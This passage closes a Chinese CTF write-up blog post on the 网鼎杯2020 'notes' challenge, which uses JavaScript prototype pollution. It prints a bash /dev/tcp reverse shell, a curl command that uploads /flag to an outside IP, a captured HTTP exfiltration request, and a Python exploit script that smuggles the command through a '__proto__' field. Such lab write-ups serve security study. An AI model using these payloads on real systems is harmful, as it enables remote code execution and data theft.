+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/IP/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>这个命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 60.204.158.87:2333</span><br><span class="line">User-Agent: curl/7.64.0</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 239</span><br><span class="line">Content-Type: multipart/form-data; boundary=------------------------57768fbacf6fb558</span><br><span class="line"></span><br><span class="line">--------------------------57768fbacf6fb558</span><br><span class="line">Content-Disposition: form-data; name=&quot;flag&quot;; filename=&quot;flag&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">flag&#123;0ae1a60d-d02d-4925-8726-2d3e3ee10e58&#125;</span><br><span class="line"></span><br><span class="line">--------------------------57768fbacf6fb558--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -F \&#x27;flag=@/flag\&#x27; IP:2333</span><br></pre></td></tr></table></figure>
+
+<p>出来的</p>
+<p>可以用脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.Session()</span><br><span class="line">url = <span class="string">&quot;http://e8af756d-8fa5-4cfd-a295-7bc1a07fd49a.node5.buuoj.cn:81/&quot;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;__proto__&#x27;</span>, <span class="string">&#x27;author&#x27;</span>: <span class="string">&#x27;curl -F \&#x27;flag=@/flag\&#x27; IP:2333&#x27;</span>, <span class="string">&#x27;raw&#x27;</span>: <span class="string">&#x27;123&#x27;</span>&#125;   <span class="comment">#bash -i &gt; /dev/tcp/IP/2333 0&gt;&amp;1</span></span><br><span class="line">a = r.post(url=url + <span class="string">&quot;edit_note&quot;</span>, data=data)</span><br><span class="line"><span class="built_in">print</span>(a.text)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Something&quot;</span> <span class="keyword">in</span> a.text:</span><br><span class="line">    b = r.get(url=url + <span class="string">&quot;status&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(b.text)</span><br></pre></td></tr></table></figure>
+
+<p>参考链接：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/242645#h2-6">https://www.anquanke.com/post/id/242645#h2-6</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>odiws</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://odiws.github.io/2024/10/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-notes/">http://odiws.github.io/2024/10/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-notes/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/buuctf/"># buuctf</a>
+                    
+                        <a href="/tags/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"># js原型链污染</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2024/10/21/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-EasySer/">[羊城杯2020]EasySer</a>
+            
+            
+            <a class="next" rel="next" href="/2024/10/17/HITCON2016-Leaking/">[HITCON2016]Leaking</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© odiws | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
